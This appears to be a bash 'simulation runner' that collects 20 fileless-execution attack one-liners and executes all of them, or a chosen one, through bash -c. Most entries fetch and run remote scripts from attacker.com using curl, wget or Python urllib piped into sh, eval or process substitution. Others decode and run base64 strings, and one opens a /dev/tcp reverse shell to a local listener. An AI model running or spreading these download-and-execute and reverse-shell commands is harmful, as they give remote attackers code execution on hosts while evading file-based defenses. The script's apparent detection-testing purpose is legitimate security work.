#!/bin/bash

# === Install figlet if missing ===
if ! command -v figlet &>/dev/null; then
  echo "Installing figlet..."
  apt-get install -y figlet &>/dev/null || yum install -y figlet &>/dev/null
fi

# === Banner ===
echo -e "\e[1;31m"
figlet FILELESS
echo -e "\e[0m\e[1;32m   20 Fileless Execution Attacks - Simulation Runner\e[0m"

# === Attack List ===
attacks=(
# 1
"curl -s http://attacker.com/payload.sh | sh"

# 2
"bash -c \"eval \$(curl -s http://attacker.com/payload.sh)\""

# 3 (reverse shell with simulated listener)
"timeout 2 nc -lvnp 4444 & sleep 0.5 && timeout 2 bash -c 'exec 5<>/dev/tcp/127.0.0.1/4444; echo \"reverse shell triggered\" >&5; cat <&5'"

# 4
"python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://attacker.com/script').read().decode())\""

# 5
"bash -s <<EOF
echo 'running payload in memory'
EOF"

# 6
"exec 3< <(echo \"echo hacked\"); bash /proc/self/fd/3"

# 7
"echo 'ZWNobyAnZmQnCg==' | base64 -d | bash"

# 8
"PAYLOAD='echo in var'; bash -c \"\$PAYLOAD\""

# 9
"exec 4< <(curl -s http://attacker.com/payload.sh); bash /proc/self/fd/4"

# 10
"bash -c \"\$(curl -s http://attacker.com/payload.sh)\""

# 11
"python3 -c \"import subprocess; subprocess.run('curl http://attacker.com/payload.sh | bash', shell=True)\""

# 12
"while read l; do eval \"\$l\"; done < <(curl -s http://attacker.com/cmds.txt)"

# 13
"eval \"\$(echo ZWNobyBoZWxsbw== | base64 -d)\""

# 14
"PAY='ZWNobyAiaGFja2VkIg=='; eval \"\$(echo \$PAY | base64 -d)\""

# 15
"python3 -c \"c='ZWNobyBwaXBlZA==';import base64,os;os.system(base64.b64decode(c))\""

# 16
"source <(echo 'echo process substituted')"

# 17
"wget -qO- http://attacker.com/lol.sh | bash"

# 18
"python3 -c \"exec(input())\" <<< \"print('Executed from input stream')\""

# 19
"curl -s http://attacker.com/enc | base64 -d | bash"

# 20
"set \$(curl -s http://attacker.com/env.sh); eval \"\$*\""
)

# === Menu ===
echo -e "\n\e[1;34mChoose an option:\e[0m"
echo "1) Run all attacks"
echo "2) Run a specific attack"
read -p $'\nSelect [1-2]: ' choice

run_attack() {
  echo -e "\n\e[1;33m[EXEC]\e[0m $1"
  bash -c "$1"
}

if [[ "$choice" == "1" ]]; then
  for i in "${!attacks[@]}"; do
    run_attack "${attacks[$i]}"
  done
elif [[ "$choice" == "2" ]]; then
  echo -e "\n\e[1;36mAvailable attacks:\e[0m"
  for i in "${!attacks[@]}"; do
    echo "$((i+1))) ${attacks[$i]}"
  done
  read -p $'\nEnter attack number [1-20]: ' index
  if [[ "$index" =~ ^[0-9]+$ ]] && (( index >= 1 && index <= 20 )); then
    run_attack "${attacks[$((index-1))]}"
  else
    echo -e "\e[1;31mInvalid index.\e[0m"
  fi
else
  echo -e "\e[1;31mInvalid choice.\e[0m"
fi
